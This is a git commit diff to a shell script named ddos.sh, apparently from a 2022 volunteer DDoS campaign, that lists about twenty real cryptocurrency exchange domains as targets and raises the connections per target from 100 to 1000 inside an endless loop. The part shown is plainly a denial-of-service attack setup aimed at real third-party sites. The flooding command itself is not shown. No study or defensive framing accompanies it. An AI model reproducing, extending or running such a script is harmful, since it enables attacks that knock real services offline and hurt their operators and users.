88179dfb644ef4d0bea9b8f0b37a83f15eb9ac74
minorsetback <vlad232362@gmail.com>
2022-02-28 20:49:24 +0200

    '2'

--- ddos.sh
+++ ddos.sh
@@ -2,7 +2,7 @@
 
 DESTS=( "https://cleanbtc.ru/""https://bonkypay.com" "https://changer.club" "https://superchange.net" "https://mine.exchange" "https://platov.co" "https://ww-pay.net" "https://delets.cash" "https://betatransfer.org" "https://ramon.money" "https://coinpaymaster.com"  "https://bitokk.biz" "https://www.netex24.net" "https://flashobmen.com" "https://abcobmen.com" "https://ychanger.net" "https://multichange.net" "https://24paybank.net" "https://royal.cash" "https://prostocash.com" "https://baksman.org" "https://kupibit.me" "https://abcobmen.com")
 TIME="60m"
-CONNACTIONSPERTARGET=100
+CONNACTIONSPERTARGET=1000
 
 while true
 do
